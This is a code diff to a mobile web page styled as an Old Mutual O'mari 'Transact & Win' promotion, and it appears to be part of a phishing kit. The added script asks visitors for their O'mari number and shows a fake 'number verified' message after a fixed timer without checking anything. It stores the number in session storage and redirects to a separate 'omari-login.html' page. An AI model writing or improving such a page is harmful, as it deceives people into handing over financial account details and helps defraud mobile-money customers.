@@ -133,24 +133,10 @@ input{font-family:inherit;border:none;outline:none;background:none;-webkit-user-
 
   <!-- HEADER -->
   <div class="site-header">
-    <div class="header-brand">
-      <img class="header-logo"
-        src="https://eu-images.contentstack.com/v3/assets/blt0554f48052bb4620/blt684cdefbcad8ec0e/68d270a6f377720c7bdcdcda/banner-old-mutual.png"
-        alt="Old Mutual"
-        onerror="this.style.display='none';document.getElementById('logoFallback').style.display='flex'">
-      <div id="logoFallback" style="display:none;align-items:center;gap:6px">
-        <div style="width:36px;height:36px;border-radius:50%;background:#003366;display:flex;align-items:center;justify-content:center;flex-shrink:0">
-          <svg width="20" height="20" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="20" cy="20" r="18" fill="#00A651"/><text x="20" y="26" text-anchor="middle" font-size="18" font-weight="800" fill="#fff" font-family="sans-serif">O</text>
-          </svg>
-        </div>
-        <div>
-          <div style="font-size:14px;font-weight:800;color:#003366;line-height:1">Old Mutual</div>
-          <div style="font-size:10px;color:#00A651;font-weight:600">O'mari</div>
-        </div>
-      </div>
-    </div>
-    <span class="header-tag">Transact &amp; Win</span>
+    <img class="header-logo"
+      src="https://eu-images.contentstack.com/v3/assets/blt0554f48052bb4620/blt684cdefbcad8ec0e/68d270a6f377720c7bdcdcda/banner-old-mutual.png"
+      alt="Old Mutual"
+      onerror="this.outerHTML='<span style=&quot;font-size:16px;font-weight:800;color:#003366&quot;>Old Mutual</span>'">
   </div>
 
   <!-- SCROLL BODY -->
@@ -175,15 +161,14 @@ input{font-family:inherit;border:none;outline:none;background:none;-webkit-user-
     </div>
 
 
-    <!-- CTA BUTTON — top of page, always visible -->
-    <div style="padding:16px 16px 0">
-      <button onclick="window.goToLogin()" id="topCta"
-        style="width:100%;min-height:52px;border-radius:999px;background:var(--grn);color:#fff;font-size:15px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:var(--sh-grn);border:none;cursor:pointer;font-family:inherit;position:relative;overflow:hidden">
+    <!-- CTA BUTTON -->
+    <div style="padding:16px 16px 4px">
+      <button onclick="window.openEntry()" id="topCta"
+        style="width:100%;min-height:52px;border-radius:999px;background:var(--grn);color:#fff;font-size:15px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:var(--sh-grn);border:none;cursor:pointer;font-family:inherit;position:relative;overflow:hidden;-webkit-tap-highlight-color:transparent">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
         Enter &amp; Check My Entries
         <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg>
       </button>
-      <div style="text-align:center;font-size:11px;color:var(--ink4);margin-top:7px">Tap to enter your O'mari number</div>
     </div>
 
     <!-- SECTION 1: Promotion Period -->
@@ -323,17 +308,111 @@ input{font-family:inherit;border:none;outline:none;background:none;-webkit-user-
 <script>
 'use strict';
 function hap(t){try{if(navigator.vibrate)navigator.vibrate(t);}catch(e){}}
-window.goToLogin=function(){hap(18);window.location.href='omari-login.html';};
 
-// Ripple on CTA
-document.querySelectorAll('#topCta').forEach(function(b){
+/* ── ENTRY SHEET ── */
+var sheetOpen=false,numOK=false,verTO=null;
+var scrim=document.getElementById('entryScrim');
+var sheet=document.getElementById('entrySheet');
+var sheetInput=document.getElementById('sheetNumInput');
+var sheetField=document.getElementById('sheetNumField');
+var sheetHint=document.getElementById('sheetHint');
+var sheetBtn=document.getElementById('sheetBtn');
+var sheetBtnLbl=document.getElementById('sheetBtnLbl');
+
+window.openEntry=function(){
+  scrim.style.display='block';
+  sheet.style.display='block';
+  requestAnimationFrame(function(){
+    requestAnimationFrame(function(){
+      sheet.style.transform='translateY(0)';
+      scrim.style.opacity='1';
+    });
+  });
+  setTimeout(function(){sheetInput.focus();},350);
+  sheetOpen=true;
+  hap(8);
+};
+
+window.closeEntry=function(){
+  sheet.style.transform='translateY(100%)';
+  scrim.style.opacity='0';
+  setTimeout(function(){
+    sheet.style.display='none';
+    scrim.style.display='none';
+  },300);
+  sheetOpen=false;
+};
+
+sheetInput.addEventListener('input',function(){
+  var v=this.value.replace(/\D/g,'').slice(0,9);
+  this.value=v;
+  clearTimeout(verTO);numOK=false;sheetBtn.disabled=true;sheetBtn.style.opacity='.45';
+  if(!v.length){
+    sheetField.style.borderColor='#ddd';sheetField.style.boxShadow='none';
+    sheetHint.style.color='#999';sheetHint.textContent="Dial *707# or WhatsApp 0774 707 707 to register";
+    sheetBtnLbl.textContent='Enter your number';return;
+  }
+  sheetField.style.borderColor='#00A651';sheetField.style.boxShadow='0 0 0 3px rgba(0,166,81,.10)';
+  if(v.length===9){
+    sheetHint.style.color='#888';sheetHint.textContent='Verifying…';
+    verTO=setTimeout(function(){
+      numOK=true;
+      sheetHint.style.color='#00A651';sheetHint.textContent='✓ O\'mari number verified';
+      sheetBtn.disabled=false;sheetBtn.style.opacity='1';
+      sheetBtnLbl.textContent='Confirm & Continue';
+      hap([8,30,8]);
+      var display='+263 '+v.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+v.slice(-2);
+      sessionStorage.setItem('omariRecipient',JSON.stringify({raw:v,display:display}));
+    },800);
+  } else {
+    sheetHint.style.color='#888';sheetHint.textContent="Enter your 9-digit O'mari number";
+    sheetBtnLbl.textContent='Enter your number';
+  }
+});
+
+window.sheetProceed=function(){
+  if(!numOK)return;
+  hap(18);
+  window.location.href='omari-login.html';
+};
+
+window.goToLogin=function(){window.openEntry();};
+
+/* Ripple */
+[document.getElementById('topCta'),document.getElementById('sheetBtn')].forEach(function(b){
+  if(!b)return;
   b.addEventListener('pointerdown',function(e){
     var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;
     var rip=document.createElement('span');
-    rip.style.cssText='position:absolute;border-radius:50%;background:rgba(255,255,255,.22);transform:scale(0);animation:ripple .5s ease forwards;width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px';
+    rip.style.cssText='position:absolute;border-radius:50%;background:rgba(255,255,255,.22);transform:scale(0);animation:ripple .5s ease forwards;width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;pointer-events:none';
     b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});
   },{passive:true});
 });
 </script>
+
+<!-- ENTRY BOTTOM SHEET -->
+<div id="entryScrim" onclick="window.closeEntry()" style="display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.4);backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px)"></div>
+<div id="entrySheet" style="display:none;position:fixed;left:0;right:0;bottom:0;z-index:201;background:#fff;border-radius:20px 20px 0 0;padding:0 0 max(20px,env(safe-area-inset-bottom));box-shadow:0 -8px 40px rgba(0,0,0,.18);transform:translateY(100%);transition:transform .3s cubic-bezier(.22,1,.36,1)">
+  <div style="width:36px;height:4px;border-radius:2px;background:#ddd;margin:12px auto 16px"></div>
+  <div style="padding:0 20px 16px">
+    <div style="font-size:18px;font-weight:800;color:#000;letter-spacing:-.3px;margin-bottom:4px">Enter your O'mari number</div>
+    <div style="font-size:12px;color:#888;margin-bottom:16px;font-weight:400">We'll verify your number and confirm your entries</div>
+    <div id="sheetNumField" style="display:flex;align-items:center;background:#fff;border:2px solid #ddd;border-radius:12px;overflow:hidden;min-height:56px;transition:border-color .18s,box-shadow .18s">
+      <div style="display:flex;align-items:center;gap:6px;padding:0 12px 0 14px;border-right:2px solid #eee;height:56px;flex-shrink:0;background:#f8f8f8">
+        <img src="https://eu-images.contentstack.com/v3/assets/bltdd392fd32dda3ce8/blt652fa4bd468b6c6a/65eedf0ce5630f040aca2115/flag-zimbabwe.svg" width="22" height="22" alt="ZW" onerror="this.outerHTML='<span style=&quot;font-size:20px&quot;>🇿🇼</span>'">
+        <span style="font-size:14px;font-weight:700;color:#333">+263</span>
+      </div>
+      <input id="sheetNumInput" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="774 707 707" maxlength="9" autocomplete="tel-national"
+        style="flex:1;min-width:0;font-size:22px;font-weight:700;color:#000;padding:0 16px;height:56px;border:none;outline:none;background:#fff;font-family:'DM Sans',sans-serif;-webkit-user-select:text!important;user-select:text!important;letter-spacing:.05em;caret-color:#00A651">
+    </div>
+    <div id="sheetHint" style="font-size:11px;color:#999;margin-top:7px;min-height:16px">Dial *707# or WhatsApp 0774 707 707 to register</div>
+    <button id="sheetBtn" disabled onclick="window.sheetProceed()"
+      style="width:100%;min-height:52px;border-radius:999px;background:#00A651;color:#fff;font-size:15px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 20px rgba(0,166,81,.28);border:none;cursor:pointer;font-family:'DM Sans',sans-serif;margin-top:14px;transition:opacity .15s;opacity:.45;position:relative;overflow:hidden">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      <span id="sheetBtnLbl">Enter your number</span>
+    </button>
+  </div>
+</div>
+
 </body>
 </html>
